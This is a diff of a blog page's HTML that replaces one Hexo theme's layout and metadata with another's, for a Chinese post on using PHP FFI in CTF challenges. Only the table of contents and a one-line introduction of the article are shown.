@@ -1,545 +1,188 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head>
+    <!-- so meta -->
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
-    
-    <meta name="author" content="baozongwi">
-    <!-- preconnect -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-    
-        
-        
-        
-            <link rel="preconnect" href="https://registry.npmmirror.com" crossorigin>
-        
-    
-    <!--- Seo Part-->
-    
-    <link rel="canonical" href="https://baozongwi.xyz/2024/11/08/php中不出网的ffi/"/>
-    <meta name="robots" content="index,follow">
-    <meta name="googlebot" content="index,follow">
-    <meta name="revisit-after" content="1 days">
-    
-    
-    
-        
-        <meta name="description" content="baozongwi的好东西">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="PHP7.4的一个拓展利用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php中不出网的FFI">
 <meta property="og:url" content="https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/index.html">
 <meta property="og:site_name" content="baozongwi:Hacking the future">
-<meta property="og:description" content="baozongwi的好东西">
+<meta property="og:description" content="PHP7.4的一个拓展利用">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://baozongwi.xyz/images/wallhaven-6drlmx.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-134035.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-133939.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-133835.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-143151.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-143400.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-162320.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-164207.png">
 <meta property="article:published_time" content="2024-11-08T01:27:18.000Z">
 <meta property="article:modified_time" content="2024-11-10T09:05:47.471Z">
 <meta property="article:author" content="baozongwi">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="姿势">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://baozongwi.xyz/images/wallhaven-6drlmx.jpg">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-134035.png">
     
     
-    <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/acvtar.jpg" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
-    <meta name="theme-color" content="#262424">
-    <link rel="shortcut icon" href="/images/acvtar.jpg">
-    <!--- Page Info-->
-    
-    <title>
+      
         
-            php中不出网的FFI | baozongwi&#39;s blog
+          <link rel="shortcut icon" href="/images/favicon.ico">
         
-    </title>
-
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">
-
-    <!--- Inject Part-->
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
     
+    <!-- title -->
+    <title>php中不出网的FFI</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
 
-
+    <!-- persian styles -->
     
-        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
-    
-
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
-    <!--- Font Part-->
+    <!-- rss -->
     
     
+      <link rel="alternate" href="/true" title="baozongwi:Hacking the future" type="application/atom+xml" />
     
-    
-    
-    
-
-    <script id="hexo-configurations">
-    window.config = {"hostname":"baozongwi.xyz","root":"/","language":"en","path":"search.json"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-6drlmx.jpg","skip_dirs":[]}},"colors":{"primary":"#262424","secondary":null,"default_mode":"auto"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/wallhaven-6drlmx.jpg","description":"baozongwi的好东西"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-6drlmx.jpg","dark":"/images/wallhaven-1jpk51.jpg"},"title":"h@cking th3 fu1rue","subtitle":{"text":["天地不仁，以万物为刍狗","你为何懒惰又好胜"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":400,"backing_speed":30,"starting_delay":50,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/baozongwi","email":"2405758945@qq.com"},"qrs":{"fa-solid fa-yen-sign":"https://baozongwi.xyz/images/sponse/wechat.jpg","fa-solid fa-dollar-sign":"https://baozongwi.xyz/images/sponse/alipay.jpg"}}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#033140","right":"#0caff5","transparency":20},"width":{"home":"1200px","pages":"1000px"},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"categories":{"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Teacher":"/teacher"}},"Links":{"icon":"fa-regular fa-link","submenus":{"Friends":"/friends","Bookmarks":"/bookmarks","Essays":"/essays"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"hexo博客已经完成，搭建博客的师傅可以试试看哦，最近可能不怎么更新了，得突击一下期末了师傅们！","show_on_mobile":true,"links":{"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":50,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":6}},"footerStart":"2024/8/08 11:45:14"};
-    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
-    window.data = {"masonry":false};
-  </script>
-    
-    <!--- Fontawesome Part-->
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
-    
-    
-    
-    
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="baozongwi:Hacking the future" type="application/atom+xml">
-</head>
-
-
-
-<body>
-	<div class="progress-bar-container">
+	<!-- mathjax -->
 	
-	<span class="scroll-progress-bar"></span>
-	
+<meta name="generator" content="Hexo 7.3.0"></head>
 
-	
-	<span class="pjax-progress-bar"></span>
-	<!--        <span class="swup-progress-icon">-->
-	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-	<!--        </span>-->
-	
-</div>
-
-<main class="page-container" id="swup">
-
-	
-
-	<div class="main-content-container flex flex-col justify-between min-h-dvh">
-		<div class="main-content-header">
-			<header class="navbar-container px-6 md:px-12">
-    <div class="navbar-content transition-navbar ">
-        <div class="left">
-            
-                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/images/acvtar.jpg" class="w-full h-full rounded-sm">
-                </a>
-            
-            <a class="logo-title" href="/">
-                
-                baozongwi&#39;s blog
-                
-            </a>
-        </div>
-
-        <div class="right">
-            <!-- PC -->
-            <div class="desktop">
-                <ul class="navbar-list">
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/"
-                                        >
-                                    <i class="fa-regular fa-house fa-fw"></i>
-                                    HOME
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/archives"
-                                        >
-                                    <i class="fa-regular fa-archive fa-fw"></i>
-                                    ARCHIVES
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class="has-dropdown"
-                                   href="#"
-                                        onClick=&#34;return false;&#34;>
-                                    <i class="fa-regular fa-user fa-fw"></i>
-                                    ABOUT
-                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                                    <ul class="sub-menu">
-                                        
-                                            <li>
-                                                <a href="/about">
-                                                    ME
-                                                </a>
-                                            </li>
-                                        
-                                            <li>
-                                                <a href="/teacher">
-                                                    TEACHER
-                                                </a>
-                                            </li>
-                                        
-                                    </ul>
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class="has-dropdown"
-                                   href="#"
-                                        onClick=&#34;return false;&#34;>
-                                    <i class="fa-regular fa-link fa-fw"></i>
-                                    LINKS
-                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                                    <ul class="sub-menu">
-                                        
-                                            <li>
-                                                <a href="/friends">
-                                                    FRIENDS
-                                                </a>
-                                            </li>
-                                        
-                                            <li>
-                                                <a href="/bookmarks">
-                                                    BOOKMARKS
-                                                </a>
-                                            </li>
-                                        
-                                            <li>
-                                                <a href="/essays">
-                                                    ESSAYS
-                                                </a>
-                                            </li>
-                                        
-                                    </ul>
-                                
-                            </li>
-                    
-                    
-                        <li class="navbar-item search search-popup-trigger">
-                            <i class="fa-solid fa-magnifying-glass"></i>
-                        </li>
-                    
-                </ul>
-            </div>
-            <!-- Mobile -->
-            <div class="mobile">
-                
-                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
-                    </div>
-                
-                <div class="icon-item navbar-bar">
-                    <div class="navbar-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mobile sheet -->
-    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
-        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/"
-                        >
-                            <span>
-                                HOME
-                            </span>
-                            
-                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/archives"
-                        >
-                            <span>
-                                ARCHIVES
-                            </span>
-                            
-                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
-                        
-                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                             navbar-data-toggle="submenu-About"
-                        >
-                            <span>
-                                ABOUT
-                            </span>
-                            
-                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
-                            
-                        </div>
-                        
-
-                        
-                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/about">ME</a>
-                                    </div>
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/teacher">TEACHER</a>
-                                    </div>
-                                
-                            </div>
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
-                        
-                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                             navbar-data-toggle="submenu-Links"
-                        >
-                            <span>
-                                LINKS
-                            </span>
-                            
-                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
-                            
-                        </div>
-                        
-
-                        
-                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/friends">FRIENDS</a>
-                                    </div>
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/bookmarks">BOOKMARKS</a>
-                                    </div>
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/essays">ESSAYS</a>
-                                    </div>
-                                
-                            </div>
-                        
-                    </li>
-            
-
-            
-            
-                
-                    
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
-                           href="/tags"
-                        >
-                            <span>Tags</span>
-                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
-                        </a>
-                    </li>
-                
-                    
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
-                           href="/categories"
-                        >
-                            <span>Categories</span>
-                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
-                        </a>
-                    </li>
-                
-            
-        </ul>
-
-        <div class="statistics flex justify-around my-2.5">
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">34</div>
-        <div class="label text-third-text-color text-sm">Tags</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
-        <div class="label text-third-text-color text-sm">Categories</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">129</div>
-        <div class="label text-third-text-color text-sm">Posts</div>
-    </a>
-</div>
-    </div>
-
-    <div class="window-mask"></div>
-
-</header>
-
-
-		</div>
-
-		<div class="main-content-body transition-fade-up">
-			
-
-			<div class="main-content">
-				<div class="post-page-container flex relative justify-between box-border w-full h-full">
-	<div class="article-content-container">
-
-		<div class="article-title relative w-full">
-			
-			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">php中不出网的FFI</h1>
-			</div>
-			
-		</div>
-
-		
-		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-				<img src="/images/acvtar.jpg">
-			</div>
-			<div class="info flex flex-col justify-between">
-				<div class="author flex items-center">
-					<span class="name text-default-text-color text-lg font-semibold">baozongwi</span>
-					
-					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv6</span>
-					
-				</div>
-				<div class="meta-info">
-					<div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-11-08 09:27:18</span>
-        <span class="mobile">2024-11-08 09:27:18</span>
-        <span class="hover-info">Created</span>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
     </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-10 17:05:47</span>
-            <span class="mobile">2024-11-10 17:05:47</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/08/github-pages%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E5%8F%8A%E5%8A%A0%E9%80%9F/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/07/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&text=php中不出网的FFI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&is_video=false&description=php中不出网的FFI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php中不出网的FFI&body=Check out this article: https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&name=php中不出网的FFI&description=PHP7.4的一个拓展利用"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&t=php中不出网的FFI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-    
-        <span class="article-categories article-meta-item">
-            <i class="fa-regular fa-folders"></i>&nbsp;
-            <ul>
-                
-                
-                    
-                        
-                        <li>
-                            <a href="/categories/talk/">talk</a>&nbsp;
-                        </li>
-                    
-                    
-                
-            </ul>
-        </span>
+    </div>
     
     
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/php/">php</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/%E5%A7%BF%E5%8A%BF/">姿势</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-question"><span class="toc-number">2.</span> <span class="toc-text">0x02 question</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3"><span class="toc-number">2.1.</span> <span class="toc-text">了解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI-cdef"><span class="toc-number">2.1.1.</span> <span class="toc-text">FFI::cdef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI-load"><span class="toc-number">2.1.2.</span> <span class="toc-text">FFI::load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI-new"><span class="toc-number">2.1.3.</span> <span class="toc-text">FFI::new</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.2.</span> <span class="toc-text">利用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCTF-2019-Nextphp"><span class="toc-number">2.2.1.</span> <span class="toc-text">[RCTF 2019]Nextphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCTF-2020-easyphp"><span class="toc-number">2.2.2.</span> <span class="toc-text">TCTF 2020 easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#noeasyphp-revenge"><span class="toc-number">2.2.3.</span> <span class="toc-text">noeasyphp(revenge)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-FighterFightsInvincibly"><span class="toc-number">2.2.4.</span> <span class="toc-text">[极客大挑战 2020] FighterFightsInvincibly</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x03 小结</span></a></li></ol>
+      </div>
     
-
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.8k Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>13 Mins</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
+  </span>
 </div>
 
-				</div>
-			</div>
-		</div>
-		
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php中不出网的FFI
+    </h1>
 
-		
 
 
-		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看</p>
+    <div class="meta">
